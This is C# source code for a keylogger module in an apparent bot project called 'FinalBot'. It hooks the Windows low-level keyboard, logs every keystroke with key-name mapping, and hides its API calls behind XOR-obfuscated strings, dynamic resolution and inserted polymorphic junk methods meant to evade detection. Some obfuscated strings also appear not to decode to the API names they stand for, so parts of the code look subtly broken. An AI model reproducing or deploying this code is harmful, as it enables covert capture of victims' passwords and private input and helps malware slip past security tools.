using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace FinalBot.Modules
{
    public static class KeyloggerModule
    {
        // [POLY_JUNK]
        private static void _vanguard_c59d3eb1() {
            int val = 56295;
            if (val > 50000) Console.WriteLine("Hash:" + 56295);
        }

        private const int _hType = 13; // WH_KEYBOARD_LL
        private const int _kDown = 0x0100; // WM_KEYDOWN
        private static LkProc _cb = HookCallback;
        private static IntPtr _hID = IntPtr.Zero;

        private delegate IntPtr LkProc(int n, IntPtr w, IntPtr l);

        private static class Native
        {
        // [POLY_JUNK]
        private static void _vanguard_c59d3eb1() {
            int val = 56295;
            if (val > 50000) Console.WriteLine("Hash:" + 56295);
        }

            public static SetHookDelegate SetHook => VanguardCore.SafetyManager.ApiInterface.GetUser32<SetHookDelegate>(DAP("PbsVikdlvpHllkBu"));
            public static UnhookDelegate Unhook => VanguardCore.SafetyManager.ApiInterface.GetUser32<UnhookDelegate>(DAP("NkhllkVikdlvpHllkBu"));
            public static CallNextDelegate CallNext => VanguardCore.SafetyManager.ApiInterface.GetUser32<CallNextDelegate>(DAP("`niisBuqHllkBu"));
            public static GetModDelegate GetMod => VanguardCore.SafetyManager.ApiInterface.GetKernel32<GetModDelegate>(DAP("`bsMlanibHnkdib"));
            public static GetMsgDelegate GetMsg => VanguardCore.SafetyManager.ApiInterface.GetUser32<GetMsgDelegate>(DAP("`bsZbppnbb"));
            public static TransMsgDelegate TransMsg => VanguardCore.SafetyManager.ApiInterface.GetUser32<TransMsgDelegate>(DAP("S_n kinsbZbppnbb"));
            public static DispMsgDelegate DispMsg => VanguardCore.SafetyManager.ApiInterface.GetUser32<DispMsgDelegate>(DAP("Apkasi`hZbppnbb"));

            private static string DAP(string s) { char[] c = new char[s.Length]; for (int i = 0; i < s.Length; i++) c[i] = (char)(s[i] ^ 0x05); return new string(c); }
        }

        private delegate IntPtr SetHookDelegate(int id, LkProc lpfn, IntPtr hMod, uint dwThreadId);
        private delegate bool UnhookDelegate(IntPtr hhk);
        private delegate IntPtr CallNextDelegate(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        private delegate IntPtr GetModDelegate(string lpModuleName);
        private delegate int GetMsgDelegate(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
        private delegate bool TransMsgDelegate([In] ref MSG lpMsg);
        private delegate IntPtr DispMsgDelegate([In] ref MSG lpMsg);

        [StructLayout(LayoutKind.Sequential)]
        private struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public POINT pt;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct POINT
        {
            public int x;
            public int y;
        }

        public static void Start()
        {
            System.Threading.Tasks.Task.Run(() =>
            {
                _hID = SetHook(_cb);
                MSG msg;
                while (Native.GetMsg(out msg, IntPtr.Zero, 0, 0) != 0)
                {
                    Native.TransMsg(ref msg);
                    Native.DispMsg(ref msg);
                }
            });
        }

        public static void Stop()
        {
            if (_hID != IntPtr.Zero)
            {
                Native.Unhook(_hID);
                _hID = IntPtr.Zero;
            }
        }

        private static IntPtr SetHook(LkProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return Native.SetHook(_hType, proc, Native.GetMod(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int n, IntPtr w, IntPtr l)
        {
            if (n >= 0 && w == (IntPtr)_kDown)
            {
                int vkCode = Marshal.ReadInt32(l);
                string keyName = GetKeyName(vkCode);
                Logger.Log(keyName, "KEY");
            }
            return Native.CallNext(_hID, n, w, l);
        }

        private static string GetKeyName(int vkCode)
        {
            // Simple mapping for common keys without using System.Windows.Forms.Keys
            switch (vkCode)
            {
                case 0x08: return "[BACKSPACE]";
                case 0x09: return "[TAB]";
                case 0x0D: return "[ENTER]\n";
                case 0x10: return "[SHIFT]";
                case 0x11: return "[CTRL]";
                case 0x12: return "[ALT]";
                case 0x14: return "[CAPS]";
                case 0x1B: return "[ESC]";
                case 0x20: return " ";
                case 0x2E: return "[DEL]";
                case 0x25: return "[LEFT]";
                case 0x26: return "[UP]";
                case 0x27: return "[RIGHT]";
                case 0x28: return "[DOWN]";
                default:
                    if (vkCode >= 0x30 && vkCode <= 0x39) return ((char)vkCode).ToString();
                    if (vkCode >= 0x41 && vkCode <= 0x5A) return ((char)vkCode).ToString();
                    return $"[VK:0x{vkCode:X2}]";
            }
        }
    }
}